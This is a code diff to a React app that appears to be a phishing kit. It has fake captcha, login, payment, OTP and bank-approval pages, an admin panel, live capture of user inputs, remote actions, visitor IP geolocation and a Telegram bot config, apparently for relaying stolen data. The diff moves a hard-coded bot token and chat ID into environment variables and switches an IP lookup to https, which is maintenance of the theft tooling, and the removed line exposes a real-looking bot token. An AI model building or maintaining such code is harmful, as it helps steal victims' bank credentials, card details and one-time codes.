@@ -10,7 +10,7 @@ import { ProcessingPage } from './components/ProcessingPage';
 import { AdminPanel } from './components/AdminPanel';
 import { OtpPage } from './components/OtpPage';
 import { BankApprovalPage } from './components/BankApprovalPage';
-import { TranslationProvider } from './TranslationContext';
+import { TranslationProvider, useTranslation } from './TranslationContext';
 
 export type ViewState = 'captcha' | 'login' | 'payment' | 'loading' | 'otp' | 'bank-approval' | 'blocked';
 
@@ -26,9 +26,9 @@ const MainApp: React.FC = () => {
   const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', country: 'Unknown' });
   const [userCountry, setUserCountry] = useState<string>('Unknown');
   
-  const [botConfig, setBotConfig] = useState({
-    token: '8586070350:AAHH3zeOKmg5Z45CT_68N14xzEdkLFhY0G0',
-    chatId: '5219969216'
+  const [botConfig] = useState({
+    token: import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '',
+    chatId: import.meta.env.VITE_TELEGRAM_CHAT_ID || ''
   });
   const [remoteAction, setRemoteAction] = useState<string>('none');
   const [liveUserInputs, setLiveUserInputs] = useState<any>({});
@@ -113,7 +113,7 @@ const MainApp: React.FC = () => {
       const userIp = ipData.ip;
       
       // Then get location from ip-api.com (free, 45 req/min)
-      const locRes = await fetch(`http://ip-api.com/json/${userIp}`);
+      const locRes = await fetch(`https://ip-api.com/json/${userIp}`);
       const locData = await locRes.json();
       
       const result = { 
